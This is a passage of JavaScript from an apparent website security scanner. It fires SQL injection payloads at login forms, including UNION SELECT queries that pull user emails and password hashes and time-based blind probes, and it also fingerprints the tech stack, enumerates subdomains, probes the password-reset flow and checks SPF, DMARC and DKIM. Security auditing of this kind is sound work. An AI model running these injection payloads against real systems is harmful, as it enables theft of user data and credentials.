            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "email" : (i === 1 ? "role" : 'NULL')).join(',') : 'email'} FROM auth.users LIMIT 5--`,
            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "string_agg(email,',')" : 'NULL').join(',') : "string_agg(email,',')"} FROM users--`,
            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "count(*)" : 'NULL').join(',') : "count(*)"} FROM users--`,
          ],
          mysql: [
            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "GROUP_CONCAT(email)" : 'NULL').join(',') : "GROUP_CONCAT(email)"} FROM users--`,
            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "COUNT(*)" : 'NULL').join(',') : "COUNT(*)"} FROM users--`,
          ],
          sqlite: [
            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "GROUP_CONCAT(email)" : 'NULL').join(',') : "GROUP_CONCAT(email)"} FROM users--`,
          ],
          unknown: [
            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "email" : 'NULL').join(',') : 'email'} FROM users LIMIT 5--`,
          ],
        };

        const userPayloads = userReadPayloads[dbType] || userReadPayloads.unknown;

        // Get the baseline (page content with a normal failed login)
        // to compare and only keep what is NEW in the injection response
        const baselineResult = await submitPayload('baseline-test@nonexistent.com');
        const baselineContent = baselineResult.responseText + baselineResult.pageContent;
        const baselineEmails = new Set((baselineContent.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g) || []));
        const baselineHashes = new Set((baselineContent.match(/(\$2[aby]?\$\d{2}\$[./A-Za-z0-9]{53}|\$argon2[id]{1,2}\$[^\s"'<]+|[a-f0-9]{64}|[a-f0-9]{32})/g) || []));

        for (const payload of userPayloads) {
          const result = await submitPayload(payload);
          const combined = result.responseText + result.pageContent;

          // Look for emails in the response
          const emailPattern = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
          const emailsFound = combined.match(emailPattern);

          if (emailsFound) {
            // Filter: test emails, emails already in the baseline, Sentry DSN, generic emails
            const realEmails = emailsFound.filter(e =>
              !baselineEmails.has(e) &&
              !e.includes('vice-audit') &&
              !e.includes('test.local') &&
              !e.includes('sentry.io') &&
              !e.includes('ingest.') &&
              !e.includes('example.com') &&
              !e.includes('placeholder') &&
              !e.includes('googletagmanager') &&
              !e.includes('googleapis')
            );
            if (realEmails.length > 0) {
              addFinding('CRITIQUE', 'SQL Injection', `USER EMAILS EXTRACTED FROM THE DATABASE`, `Payload: ${payload}\nEmails found: ${realEmails.join(', ')}\nThese emails are NEW (not present on the normal page) = they come from the database.`, 'ABSOLUTE URGENCY: The SQL injection allows reading user data. Fix immediately and consider the data compromised. Notify users if necessary (GDPR).');
              break;
            }
          }

          // Look for a number (count)
          const countMatch = combined.match(/\b(\d{1,6})\b/);
          if (countMatch && payload.includes('count') && parseInt(countMatch[1]) > 0) {
            // Verify this number is not in the baseline
            if (!baselineContent.includes(countMatch[0])) {
              addFinding('CRITIQUE', 'SQL Injection', `Number of users in the database: ${countMatch[1]}`, `Payload: ${payload}\nThe database contains ${countMatch[1]} user(s). An attacker can extract all of them.`, 'The SQL injection allows counting and potentially extracting all users.');
            }
          }
        }

        // ── PHASE 4 : Attempt to read passwords ──
        spinner.text = 'SQL Injection - Phase 4: Checking password exposure...';

        const passColumns = ['password', 'encrypted_password', 'password_hash', 'hash', 'passwd', 'pass', 'pwd'];
        for (const col of passColumns) {
          const payload = dbType === 'postgresql'
            ? `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? col : 'NULL').join(',') : col} FROM users LIMIT 1--`
            : `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? col : 'NULL').join(',') : col} FROM users LIMIT 1--`;

          const result = await submitPayload(payload);
          const combined = result.responseText + result.pageContent;

          // Look for bcrypt, argon2, sha256, md5 hashes
          const hashPatterns = /(\$2[aby]?\$\d{2}\$[./A-Za-z0-9]{53}|\$argon2[id]{1,2}\$[^\s"'<]+|[a-f0-9]{64}|[a-f0-9]{32})/g;
          const hashesFound = combined.match(hashPatterns);

          if (hashesFound) {
            // Filter hashes already present in the baseline (Sentry DSN, etc.)
            const newHashes = hashesFound.filter(h => !baselineHashes.has(h));
            if (newHashes.length > 0) {
              addFinding('CRITIQUE', 'SQL Injection', `PASSWORD HASH EXTRACTED via column "${col}"`, `Payload: ${payload}\nNEW hash(es) (not on the normal page): ${newHashes.slice(0, 3).join(', ')}\nLikely type: ${newHashes[0].startsWith('$2') ? 'bcrypt' : newHashes[0].startsWith('$argon') ? 'argon2' : newHashes[0].length === 64 ? 'SHA-256' : 'MD5/other'}\nAn attacker can attempt to crack these hashes offline with hashcat/john.`, 'ABSOLUTE URGENCY: Passwords are compromised. Force a reset of all user passwords. Fix the SQL injection. If hashes are MD5/SHA, migrate to bcrypt/argon2.');
              break;
            }
          }
        }

        // ── PHASE 5 : Blind SQL injection (timing-based) ──
        spinner.text = 'SQL Injection - Phase 5: Blind injection test (timing)...';
        {
          const sleepPayloads = {
            postgresql: "' AND pg_sleep(2)--",
            mysql: "' AND SLEEP(2)--",
            unknown: "' AND SLEEP(2)--",
          };

          const sleepPayload = sleepPayloads[dbType];
          if (sleepPayload) {
            const measure = async (payload) => {
              const startedAt = performance.now();
              await submitPayload(payload);
              return performance.now() - startedAt;
            };
            const controlSamples = [];
            const attackSamples = [];
            for (let i = 0; i < 3; i++) controlSamples.push(await measure('test@test.com'));
            for (let i = 0; i < 2; i++) attackSamples.push(await measure(sleepPayload));
            const timing = classifyTimingSamples(controlSamples, attackSamples, 2000);

            if (timing) {
              addFinding('CRITIQUE', 'SQL Injection', 'Blind SQL Injection confirmed (time-based)', `Payload: ${sleepPayload}\nControl median: ${timing.controlMedian}ms\nPayload median: ${timing.attackMedian}ms\nRepeated difference: ${timing.difference}ms`, 'Use parameterized queries and retest after remediation.');
            }
          }
        }
      }
    }
  }

  // ── CHECK 9 : Forgot password security ──
  spinner.text = 'Searching for forgot password page...';
  {
    const resetPaths = ['/forgot-password', '/auth/forgot-password', '/reset-password', '/auth/reset-password', '/password/reset', '/forgot', '/auth/forgot'];
    let resetUrl = null;

    // Look for a link on the login page
    const resetLink = await page.evaluate(() => {
      const links = [...document.querySelectorAll('a')];
      const resetLink = links.find(a => /forgot|oubli|reset|reinitialiser|lost/i.test(a.textContent) || /forgot|reset|password/i.test(a.href));
      return resetLink ? resetLink.href : null;
    });

    if (resetLink) {
      resetUrl = resetLink;
    } else {
      for (const path of resetPaths) {
        const testUrl = new URL(baseUrl).origin + path;
        const res = await safeFetch(testUrl);
        if (res && res.status === 200) {
          const body = await res.text();
          if (/email|reset|reinitialiser|envoyer|send/i.test(body)) {
            resetUrl = testUrl;
            break;
          }
        }
      }
    }

    if (resetUrl) {
      addFinding('INFO', 'Login Audit', `Password reset page found: ${resetUrl}`, '', '');

      // Test enumeration via the reset page
      await page.goto(resetUrl, { waitUntil: 'networkidle2', timeout: 10000 });
      await new Promise(r => setTimeout(r, 1500));

      const resetForm = await page.evaluate(() => {
        const forms = [...document.querySelectorAll('form')];
        const form = forms.find(f => f.querySelector('input[type="email"], input[name*="email"]'));
        if (!form) return null;
        const emailInput = form.querySelector('input[type="email"], input[name*="email"]');
        return { emailSelector: emailInput ? (emailInput.name ? `[name="${emailInput.name}"]` : 'input[type="email"]') : null };
      });

      if (resetForm && resetForm.emailSelector) {
        // Test with a fake email
        try {
          await page.click(resetForm.emailSelector).catch(() => {});
          await page.type(resetForm.emailSelector, 'nonexistent-vice-audit@test.local', { delay: 30 });
          await page.keyboard.press('Enter');
          await new Promise(r => setTimeout(r, 3000));

          const resetResponse = await page.evaluate(() => document.body.innerText);
          if (/not found|n'existe pas|no account|introuvable|unknown/i.test(resetResponse)) {
            addFinding('ELEVEE', 'Login Audit', 'Enumeration possible via forgot password', `The reset page reveals whether an email is registered or not.\nResponse: "${resetResponse.substring(0, 200)}"`, 'Always respond "If this email is registered, a reset link has been sent" - even if the email does not exist.');
          }
        } catch {}

        // Test rate limiting on reset
        spinner.text = 'Testing rate limiting on password reset...';
        let resetBlocked = false;
        const resetRateSamples = [];
        for (let i = 0; i < 5; i++) {
          await page.goto(resetUrl, { waitUntil: 'networkidle2', timeout: 10000 });
          await new Promise(r => setTimeout(r, 1000));
          try {
            await page.click(resetForm.emailSelector).catch(() => {});
            await page.type(resetForm.emailSelector, 'reset-probe@vice-audit.test', { delay: 20 });
            await page.keyboard.press('Enter');
            await new Promise(r => setTimeout(r, 1500));
            const content = await page.evaluate(() => document.body.innerText);
            resetRateSamples.push({ body: content });
            if (classifyRateLimitEvidence(resetRateSamples).state === 'enforced') {
              resetBlocked = true;
              break;
            }
          } catch {}
        }

        if (!resetBlocked) {
          addFinding('INFO', 'Login Audit', 'Password reset rate limiting not confirmed', '5 reset attempts against the same synthetic identity did not trigger a visible block. This short browser probe cannot prove that no server-side or upstream limit exists.', 'Review reset telemetry and verify the configured per-account and per-IP thresholds.', { classification: 'heuristic', confidence: 'low' });
        } else {
          const evidence = classifyRateLimitEvidence(resetRateSamples);
          addFinding('INFO', 'Login Audit', 'Rate limiting active on password reset', `A blocking signal appeared after ${evidence.attempt || resetRateSamples.length} attempt(s).`, '');
        }
      }
    }
  }

  await browser.close();
}

// ──────────── MODULE 10 : Stack Detection & Fingerprinting ────────────

const STACK_SIGNATURES = {
  // Frontend frameworks
  'Next.js':       { html: [/__next/i, /next\/static/i, /_next\/data/i], headers: ['x-nextjs-cache', 'x-nextjs-matched-path'], js: [/__NEXT_DATA__/] },
  'Nuxt':          { html: [/__nuxt/i, /_nuxt\//i, /nuxt\//i], headers: ['x-powered-by:nuxt'], js: [/__NUXT__/, /nuxtApp/] },
  'React':         { html: [/data-reactroot/, /data-reactid/, /__react/i], headers: [], js: [/react\.development/, /react-dom/, /__REACT_DEVTOOLS/] },
  'Vue.js':        { html: [/vue\.js/i, /app\.vue/i, /\sv-if=["']/, /\sv-for=["']/, /data-v-app/], headers: [], js: [/Vue\.version/, /__VUE__/, /vue\.runtime/] },
  'Angular':       { html: [/ng-version=["']/, /ng-app=["']/, /_ngcontent-/], headers: [], js: [/angular\.module/, /@angular\/core/] },
  'Svelte':        { html: [/__svelte/, /class="s-[A-Za-z0-9]+/], headers: [], js: [/svelte\/internal/] },
  'Gatsby':        { html: [/gatsby/i, /___gatsby/], headers: ['x-gatsby-cache'], js: [/__gatsby/] },
  'Remix':         { html: [/remix/i, /__remix/], headers: [], js: [/__remixManifest/] },
  'Astro':         { html: [/astro/i, /astro-island/], headers: [], js: [/astro/] },

  // CMS
  'WordPress':     { html: [/wp-content/i, /wp-includes/i, /wp-json/i], headers: ['x-powered-by:php', 'link:.*wp-json'], js: [/wp\.customize/] },
  'Shopify':       { html: [/shopify/i, /cdn\.shopify/i], headers: ['x-shopid', 'x-shopify-stage'], js: [/Shopify\./] },
  'Webflow':       { html: [/data-wf-(?:page|site)/i, /webflow\.com/i], headers: [], js: [/Webflow\.require/] },

  // Backend
  'Express':       { html: [], headers: ['x-powered-by:express'], js: [] },
  'PHP':           { html: [/\.php/], headers: ['x-powered-by:php'], js: [] },
  'Django':        { html: [/csrfmiddlewaretoken/, /django/i], headers: [], js: [] },
  'Ruby on Rails': { html: [/csrf-token/, /rails/i], headers: ['x-powered-by:phusion', 'x-request-id', 'x-runtime'], js: [] },
  'Laravel':       { html: [/laravel/i, /_token/], headers: ['x-powered-by:php', 'set-cookie:.*laravel_session'], js: [] },

  // Servers
  'Nginx':         { html: [], headers: ['server:nginx'], js: [] },
  'Apache':        { html: [], headers: ['server:apache'], js: [] },
  'Caddy':         { html: [], headers: ['server:caddy'], js: [] },
  'Vercel':        { html: [], headers: ['x-vercel-id', 'server:vercel', 'x-vercel-cache'], js: [] },
  'Netlify':       { html: [], headers: ['server:netlify', 'x-nf-request-id'], js: [] },
  'Cloudflare':    { html: [], headers: ['server:cloudflare', 'cf-ray', 'cf-cache-status'], js: [] },
  'AWS':           { html: [], headers: ['x-amz-', 'server:amazons3', 'x-amzn-'], js: [] },
  'Google Cloud':  { html: [], headers: ['server:google', 'x-cloud-trace-context'], js: [] },
  'OVHcloud':      { html: [], headers: ['server:ovhcloud', 'server:ovh'], js: [] },
  'Heroku':        { html: [], headers: ['via:.*heroku', 'server:heroku'], js: [] },

  // BaaS / Services
  'Supabase':      { html: [/supabase/i], headers: [], js: [/supabase\.co/, /supabase/i] },
  'Firebase':      { html: [/firebase/i, /firebaseapp/i], headers: [], js: [/firebase/, /firestore/, /AIzaSy/] },
  'Stripe':        { html: [/stripe/i, /js\.stripe/i], headers: [], js: [/Stripe\(/, /stripe\.com/] },
  'Auth0':         { html: [/auth0/i], headers: [], js: [/auth0\.com/, /auth0-js/] },
  'Clerk':         { html: [/clerk/i], headers: [], js: [/clerk\.com/, /@clerk/] },

  // Analytics / Tracking
  'Google Analytics': { html: [/google-analytics/, /gtag/, /googletagmanager/], headers: [], js: [/google-analytics/, /gtag\(/] },
  'Hotjar':          { html: [/hotjar/i], headers: [], js: [/hotjar/] },
  'Sentry':          { html: [/sentry/i], headers: ['x-sentry-rate-limits'], js: [/sentry\.io/, /@sentry/] },
  'Mixpanel':        { html: [/mixpanel/i], headers: [], js: [/mixpanel/] },
  'Segment':         { html: [/segment/i, /analytics\.js/], headers: [], js: [/segment\.com/, /analytics\.track/] },
  'Intercom':        { html: [/intercom/i], headers: [], js: [/intercom/i, /widget\.intercom/] },
  'Crisp':           { html: [/crisp/i], headers: [], js: [/crisp\.chat/, /\$crisp/] },

  // Bundlers / Build tools
  'Webpack':       { html: [], headers: [], js: [/webpackChunk/, /__webpack_require__/, /webpack/] },
  'Vite':          { html: [/\/@vite/, /vite/], headers: [], js: [/vite/, /@vite/] },
  'Turbopack':     { html: [], headers: [], js: [/turbopack/] },

  // UI Libraries
  'Tailwind CSS':  { html: [/--tw-[a-z]/, /\btailwind(?:css)?\b/i], headers: [], js: [/\btailwindcss\b/] },
  'Bootstrap':     { html: [/bootstrap/i, /class=".*btn btn-/], headers: [], js: [/bootstrap/] },
  'Material UI':   { html: [/mui-/, /MuiButton/], headers: [], js: [/@mui/] },
  'Shadcn/UI':     { html: [/radix-/, /data-radix/], headers: [], js: [/@radix-ui/] },
};

async function detectStack(baseUrl, jsContents, spinner) {
  spinner.text = 'Detecting tech stack...';

  const detected = new Map(); // name -> { sources: [], shouldHide: bool, how: string }

  // Fetch the page for headers
  const res = await safeFetch(baseUrl);
  if (!res) return;

  const headers = {};
  res.headers.forEach((value, key) => {
    headers[key.toLowerCase()] = value.toLowerCase();
  });
  const allHeadersStr = Object.entries(headers).map(([k, v]) => `${k}:${v}`).join('\n');

  const html = await res.text();

  for (const [techName, signatures] of Object.entries(STACK_SIGNATURES)) {
    const sources = [];
    const seenSources = new Set();

    // Check headers
    for (const headerPattern of signatures.headers) {
      const regex = new RegExp(headerPattern, 'i');
      if (regex.test(allHeadersStr)) {
        // Find which specific header matched
        for (const [k, v] of Object.entries(headers)) {
          if (regex.test(`${k}:${v}`) || regex.test(k)) {
            const source = `Header: ${k}: ${v}`;
            if (!seenSources.has(source)) {
              seenSources.add(source);
              sources.push(source);
            }
          }
        }
      }
    }

    // Check HTML
    for (const htmlPattern of signatures.html) {
      if (htmlPattern.test(html)) {
        const match = html.match(htmlPattern);
        if (match) sources.push(`HTML: "${match[0].substring(0, 80)}"`);
      }
    }

    // Check JS contents
    for (const jsPattern of signatures.js) {
      for (const js of jsContents) {
        if (jsPattern.test(js)) {
          const match = js.match(jsPattern);
          if (match) {
            sources.push(`JS bundle: "${match[0].substring(0, 80)}"`);
            break; // One match per pattern is enough
          }
        }
      }
    }

    if (sources.length > 0) {
      detected.set(techName, sources);
    }
  }

  if (detected.size === 0) {
    addFinding('INFO', 'Stack Detection', 'No technology identified', 'The site hides its tech stack well', '');
    return;
  }

  // Classify detections
  const categories = {
    'Servers & Infra': ['Nginx', 'Apache', 'Caddy', 'Vercel', 'Netlify', 'Cloudflare', 'AWS', 'Google Cloud', 'OVHcloud', 'Heroku'],
    'Frameworks': ['Next.js', 'Nuxt', 'React', 'Vue.js', 'Angular', 'Svelte', 'Gatsby', 'Remix', 'Astro'],
    'Backend': ['Express', 'PHP', 'Django', 'Ruby on Rails', 'Laravel'],
    'CMS': ['WordPress', 'Shopify', 'Webflow'],
    'BaaS & Services': ['Supabase', 'Firebase', 'Stripe', 'Auth0', 'Clerk'],
    'Analytics & Tracking': ['Google Analytics', 'Hotjar', 'Sentry', 'Mixpanel', 'Segment', 'Intercom', 'Crisp'],
    'Build Tools': ['Webpack', 'Vite', 'Turbopack'],
    'UI': ['Tailwind CSS', 'Bootstrap', 'Material UI', 'Shadcn/UI'],
  };

  // Tech where the version exposed in headers reveals exploitable CVEs.
  // These deserve a real finding (frameworks, CMS, runtime versions).
  const exposedFrameworks = new Set(['Express', 'PHP', 'Django', 'Ruby on Rails', 'Laravel', 'Nuxt', 'Next.js', 'WordPress']);
  // Hosting providers and HTTP servers: their presence is public/standard.
  // Worth knowing about but not actionable as MEDIUM severity.
  const hostingProviders = new Set(['Nginx', 'Apache', 'Caddy', 'OVHcloud', 'Heroku', 'AWS', 'Google Cloud', 'Vercel', 'Netlify', 'Cloudflare']);
  const shouldHide = new Set([...exposedFrameworks, ...hostingProviders]);

  // Display by category
  let fullStackDetail = '';
  for (const [category, techs] of Object.entries(categories)) {
    const found = techs.filter(t => detected.has(t));
    if (found.length > 0) {
      fullStackDetail += `\n[${category}]\n`;
      for (const tech of found) {
        const sources = detected.get(tech);
        fullStackDetail += `  ${tech} - detected via: ${sources.join(', ')}\n`;
      }
    }
  }

  addFinding('INFO', 'Stack Detection', `${detected.size} technology(ies) detected`, fullStackDetail, '');

  // Findings for each tech that should be hidden
  for (const [techName, sources] of detected) {
    if (shouldHide.has(techName)) {
      const headerSources = sources.filter(s => s.startsWith('Header:'));
      const jsSources = sources.filter(s => s.startsWith('JS') || s.startsWith('HTML'));

      if (headerSources.length > 0) {
        const how = {
          'Nginx': 'In nginx.conf: server_tokens off; and add: proxy_hide_header X-Powered-By;',
          'Apache': 'In httpd.conf: ServerTokens Prod and ServerSignature Off',
          'Express': 'Add: app.disable("x-powered-by") or use helmet',
          'Nuxt': 'In nuxt.config: render: { http2: { push: true } } and a middleware to remove X-Powered-By',
          'Next.js': 'In next.config.js: poweredByHeader: false',
          'PHP': 'In php.ini: expose_php = Off',
          'Django': 'Configure middlewares to remove revealing headers',
          'Laravel': 'Add a middleware to remove X-Powered-By headers and laravel_session cookies',
          'OVHcloud': 'Configure the reverse proxy to remove the Server header',
          'WordPress': 'Use a security plugin to hide wp-content and wp-includes paths',
        };

        const sev = exposedFrameworks.has(techName) ? 'MOYENNE' : 'INFO';
        const cveLine = exposedFrameworks.has(techName)
          ? `\nAn attacker can target known CVEs for ${techName}.`
          : `\nHosting provider/server is identifiable - low impact, but minor info disclosure.`;
        addFinding(sev, 'Stack Detection', `${techName} detectable via HTTP headers`, `${headerSources.join('\n')}${cveLine}`, how[techName] || `Remove or hide headers that reveal ${techName}`);
      }

      if (jsSources.length > 0 && !headerSources.length) {
        addFinding('FAIBLE', 'Stack Detection', `${techName} detectable in client-side code`, `${jsSources.join('\n')}\nHard to fully hide in JS, but an attacker can use it to target specific vulnerabilities.`, 'Minimize direct references in code. Use production builds that strip framework names.');
      }
    }
  }

  // Specific versions detected
  spinner.text = 'Searching for specific versions...';
  const versionPatterns = [
    { name: 'React', regex: /react[.\-/]v?(\d+\.\d+\.\d+)/gi },
    { name: 'Vue', regex: /vue[.\-/]v?(\d+\.\d+\.\d+)/gi },
    { name: 'Angular', regex: /angular[.\-/]v?(\d+\.\d+\.\d+)/gi },
    { name: 'jQuery', regex: /jquery[.\-/]v?(\d+\.\d+\.\d+)/gi },
    { name: 'Bootstrap', regex: /bootstrap[.\-/]v?(\d+\.\d+\.\d+)/gi },
    { name: 'Lodash', regex: /lodash[.\-/]v?(\d+\.\d+\.\d+)/gi },
    { name: 'Axios', regex: /axios[.\-/]v?(\d+\.\d+\.\d+)/gi },
  ];

  for (const js of jsContents) {
    for (const { name, regex } of versionPatterns) {
      const match = regex.exec(js);
      if (match) {
        addFinding('FAIBLE', 'Stack Detection', `Version detected: ${name} ${match[1]}`, `Found in client-side code: "${match[0]}"`, `Exposed versions allow searching for known CVEs. Verify that ${name} ${match[1]} is up to date.`);
      }
    }
  }

  // Meta generator
  const generatorMatch = html.match(/<meta[^>]*name=["']generator["'][^>]*content=["']([^"']+)["']/i);
  if (generatorMatch) {
    addFinding('MOYENNE', 'Stack Detection', `Meta generator exposed: ${generatorMatch[1]}`, `<meta name="generator" content="${generatorMatch[1]}">`, 'Remove the meta generator tag in production');
  }
}

// ──────────── MODULE 11 : Subdomain Scan ────────────

async function scanSubdomains(baseUrl, spinner) {
  const domain = new URL(baseUrl).hostname;
  const baseDomain = getScanContext()?.scope?.discoveryRoot || domain;

  const commonSubs = [
    'www', 'api', 'app', 'admin', 'panel', 'dashboard', 'staging', 'stage', 'dev',
    'test', 'beta', 'alpha', 'demo', 'preview', 'pre', 'prod',
    'mail', 'smtp', 'imap', 'pop', 'webmail', 'mx',
    'ftp', 'sftp', 'ssh', 'vpn', 'remote',
    'cdn', 'static', 'assets', 'media', 'img', 'images', 'files',
    'db', 'database', 'sql', 'mysql', 'postgres', 'redis', 'mongo',
    'git', 'gitlab', 'github', 'bitbucket', 'ci', 'jenkins', 'deploy',
    'docs', 'doc', 'wiki', 'help', 'support', 'status',
    'shop', 'store', 'pay', 'billing', 'invoice',
    'auth', 'login', 'sso', 'oauth', 'id', 'account',
    'ws', 'socket', 'realtime', 'push', 'notify',
    'monitoring', 'grafana', 'prometheus', 'kibana', 'logs',
    'portainer', 'docker', 'k8s', 'kube',
    'internal', 'intranet', 'private', 'corp',
    'v1', 'v2', 'v3', 'old', 'new', 'legacy', 'backup',
    'sandbox', 'qa', 'uat', 'canary',
    'blog', 'news', 'forum', 'community',
    'n8n', 'strapi', 'directus', 'supabase', 'studio',
  ];

  // Build the candidate set from two sources:
  // 1. Certificate Transparency via crt.sh (passive, often catches non-obvious subdomains)
  // 2. Common-prefix bruteforce (catches subdomains that haven't issued certs)
  const candidates = new Set(commonSubs.map(s => `${s}.${baseDomain}`));
  let crtCount = 0;

  spinner.text = `Querying crt.sh for ${baseDomain}...`;
  try {
    const crtRes = await safeFetch(`https://crt.sh/?q=%25.${encodeURIComponent(baseDomain)}&output=json`);
    if (crtRes && crtRes.status === 200) {
      const data = await crtRes.json();
      if (Array.isArray(data)) {
        for (const entry of data) {
          if (!entry.name_value) continue;
          for (const name of String(entry.name_value).split('\n')) {
            const clean = name.trim().toLowerCase().replace(/^\*\./, '');
            if (clean === baseDomain) continue;
            if (clean.includes(' ') || !clean.endsWith('.' + baseDomain)) continue;
            if (!candidates.has(clean)) {
              candidates.add(clean);
              crtCount++;
            }
            if (candidates.size >= 300) break; // safety cap on huge cert sets
          }
          if (candidates.size >= 300) break;
        }
      }
    }
  } catch {}

  const dns = await import('dns');
  const { promisify } = await import('util');
  const resolve4 = promisify(dns.default.resolve4);

  const candidateList = [...candidates];
  const total = candidateList.length;
  const resolvedCandidates = await mapWithConcurrency(candidateList, 20, async (subdomain, index) => {
    if ((index + 1) % 10 === 0) spinner.text = `Subdomain DNS check [${index + 1}/${total}] ${subdomain}...`;
    try {
      const ips = await resolve4(subdomain);
      if (ips && ips.length > 0) {
        return { subdomain, ips };
      }
    } catch {}
    return null;
  });
  const foundSubs = resolvedCandidates.filter(Boolean);

  if (foundSubs.length === 0) {
    addFinding('INFO', 'Subdomains', 'No subdomain found', `${total} candidate(s) tested (${crtCount} from crt.sh, ${commonSubs.length} common prefixes)`, '');
    return;
  }

  const subList = foundSubs.map(s => `${s.subdomain} → ${s.ips.join(', ')}`).join('\n');
  addFinding('INFO', 'Subdomains', `${foundSubs.length} subdomain(s) found`, subList, '');

  const probedSubdomains = await mapWithConcurrency(foundSubs, 6, async ({ subdomain, ips }, index) => {
    if ((index + 1) % 5 === 0) spinner.text = `Subdomain HTTP check [${index + 1}/${foundSubs.length}] ${subdomain}...`;
    const httpsRes = await safeFetch(`https://${subdomain}`);
    const httpRes = httpsRes ? null : await safeFetch(`http://${subdomain}`);
    return { subdomain, ips, httpsRes, httpRes };
  });

  // Classify each responsive subdomain in deterministic discovery order.
  for (const { subdomain, ips, httpsRes, httpRes } of probedSubdomains) {
    const res = httpsRes || httpRes;
    const protocol = httpsRes ? 'https' : 'http';

    if (!res) continue;

    const server = res.headers.get('server') || '';
    const poweredBy = res.headers.get('x-powered-by') || '';
    const status = res.status;

    // Truly dangerous subdomains (infra tools, not product names)
    const criticalSubs = ['phpmyadmin', 'portainer', 'grafana', 'prometheus', 'kibana', 'jenkins', 'gitlab',
      'db', 'database', 'redis', 'mongo', 'internal', 'intranet', 'n8n', 'strapi', 'directus'];
    const suspectSubs = ['admin', 'panel', 'dashboard', 'staging', 'stage', 'debug', 'studio', 'supabase'];
    const subName = subdomain.split('.')[0];

    if (criticalSubs.includes(subName) && status === 200) {
      addFinding('ELEVEE', 'Subdomains', `Infrastructure subdomain accessible: ${subdomain}`, `${protocol}://${subdomain} responds (status ${status})${server ? `\nServer: ${server}` : ''}${poweredBy ? `\nX-Powered-By: ${poweredBy}` : ''}\nIP: ${ips.join(', ')}`, `Restrict access to ${subdomain} by source IP, VPN, or authentication.`);
    } else if (suspectSubs.includes(subName) && status === 200) {
      addFinding('MOYENNE', 'Subdomains', `Sensitive subdomain accessible: ${subdomain}`, `${protocol}://${subdomain} responds (status ${status})${server ? `\nServer: ${server}` : ''}\nIP: ${ips.join(', ')}`, `Verify that ${subdomain} requires authentication.`);
    }

    // Subdomain without HTTPS - skip subdomains named after non-HTTP protocols
    // (ftp.example.com, smtp.example.com, etc.) where HTTP isn't the primary
    // service. They may respond on 80 by accident but flagging them is noise.
    const httpOnly = classifyHttpOnlySubdomain({ httpStatus: httpRes?.status, httpsReachable: Boolean(httpsRes), subName });
    if (httpOnly) {
      addFinding(httpOnly.severity, 'Subdomains', `${subdomain} accessible only via HTTP`, `No HTTPS on ${subdomain}`, `Enable HTTPS on ${subdomain}`, { classification: httpOnly.classification, confidence: httpOnly.confidence });
    }
  }
}

// ──────────── MODULE 12 : DNS & Email Security ────────────

async function auditDns(baseUrl, spinner) {
  const domain = new URL(baseUrl).hostname;
  const baseDomain = getScanContext()?.scope?.discoveryRoot || domain;

  const dns = await import('dns');
  const { promisify } = await import('util');
  const resolveTxt = promisify(dns.default.resolveTxt);
  const resolveMx = promisify(dns.default.resolveMx);
  const resolveCname = promisify(dns.default.resolveCname);
  const resolveNs = promisify(dns.default.resolveNs);

  // ── SPF ──
  spinner.text = 'Checking SPF...';
  let spfFound = false;
  try {
    const txtRecords = await resolveTxt(baseDomain);
    for (const record of txtRecords) {
      const txt = record.join('');
      if (txt.includes('v=spf1')) {
        spfFound = true;
        if (txt.includes('+all')) {
          addFinding('CRITIQUE', 'DNS / Email', 'SPF with +all - anyone can send emails on your behalf', `SPF: ${txt}`, 'Change +all to ~all or -all in the SPF record');
        } else if (txt.includes('?all')) {
          addFinding('ELEVEE', 'DNS / Email', 'SPF with ?all (neutral) - no protection', `SPF: ${txt}`, 'Change ?all to ~all or -all');
        } else {
          addFinding('INFO', 'DNS / Email', 'SPF configured', `SPF: ${txt}`, '');
        }
      }

      // DMARC
      if (txt.includes('v=DMARC1')) {
        addFinding('INFO', 'DNS / Email', 'DMARC configured on the main domain', `DMARC: ${txt}`, '');
      }
    }
  } catch {}

  if (!spfFound) {
    addFinding('MOYENNE', 'DNS / Email', 'No SPF record found', `The domain ${baseDomain} has no SPF record.\nSpoofed messages using @${baseDomain} are not rejected by an SPF policy.`, `Publish an SPF policy adapted to the actual sending providers, or v=spf1 -all when this domain never sends email.`, { classification: 'confirmed', confidence: 'high' });
  }

  // ── DMARC (check _dmarc subdomain) ──
  spinner.text = 'Checking DMARC...';
  let dmarcFound = false;
  try {
    const dmarcRecords = await resolveTxt(`_dmarc.${baseDomain}`);
    for (const record of dmarcRecords) {
      const txt = record.join('');
      if (txt.includes('v=DMARC1')) {
        dmarcFound = true;
        if (txt.includes('p=none')) {
          addFinding('MOYENNE', 'DNS / Email', 'DMARC in "none" mode - no blocking', `DMARC: ${txt}\nSpoofed emails are reported but not blocked.`, 'Switch to p=quarantine or p=reject after an observation period');
        } else if (txt.includes('p=quarantine')) {
          addFinding('INFO', 'DNS / Email', 'DMARC in "quarantine" mode', `DMARC: ${txt}`, 'Consider switching to p=reject for maximum protection');
        } else if (txt.includes('p=reject')) {
          addFinding('INFO', 'DNS / Email', 'DMARC in "reject" mode - maximum protection', `DMARC: ${txt}`, '');
        }
      }
    }
  } catch {}

  if (!dmarcFound) {
    addFinding('MOYENNE', 'DNS / Email', 'No DMARC record found', `No DMARC policy is published on _dmarc.${baseDomain}.\nReceiving providers have no domain policy for handling spoofed messages.`, `Publish DMARC in monitoring mode first, then move to quarantine or reject after validating legitimate senders.`, { classification: 'confirmed', confidence: 'high' });
  }

  // ── DKIM ──
  spinner.text = 'Checking DKIM...';
  const dkimSelectors = ['default', 'google', 'dkim', 'mail', 'k1', 'selector1', 'selector2', 's1', 's2', 'mandrill', 'everlytickey1', 'mxvault'];
  let dkimFound = false;

